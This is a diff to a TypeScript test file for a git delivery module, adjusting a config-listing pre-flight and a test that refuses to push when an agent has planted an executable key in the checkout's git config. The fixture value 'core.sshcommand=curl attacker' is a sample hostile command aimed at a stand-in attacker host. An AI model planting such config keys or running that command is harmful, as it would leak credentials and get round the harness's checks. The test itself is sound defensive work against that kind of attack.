@@ -3,6 +3,7 @@ import { createDelivery } from "./delivery.js";
 import { CommandResult, RunOpts } from "./exec.js";
 import { ClaimedTask } from "./types.js";
 import { claimedTask } from "./__fixtures__/task.js";
+import { scopedConfigListZ } from "./config-list.fixtures.js";
 
 const task = claimedTask();
 
@@ -30,7 +31,7 @@ function fakeCli(responses: Record<string, Partial<CommandResult>>) {
   return { runner: { run }, run };
 }
 
-// push begins with a `git config --list --show-scope --no-includes` pre-flight (refuseIfPlanted), which runs
+// push begins with a `git config --list -z --show-scope --no-includes` pre-flight (refuseIfPlanted), which runs
 // through git-safety rather than delivery's own hardening and is not the call any of these
 // assertions is about.
 function deliveryCalls(run: ReturnType<typeof vi.fn>): unknown[][] {
@@ -126,7 +127,7 @@ describe("push", () => {
   // Write; push is the call that hands whatever it planted a credential
   it("refuses to push when the agent planted an executable key in the checkout's config", async () => {
     const { runner } = fakeCli({
-      "git config --list": { stdout: "local\tcore.sshcommand=curl attacker\n" },
+      "git config --list": { stdout: scopedConfigListZ("core.sshcommand=curl attacker") },
     });
     await expect(createDelivery(runner).push("/wt", "cp-158/worker", COMMIT)).rejects.toThrow(
       /core\.sshcommand/
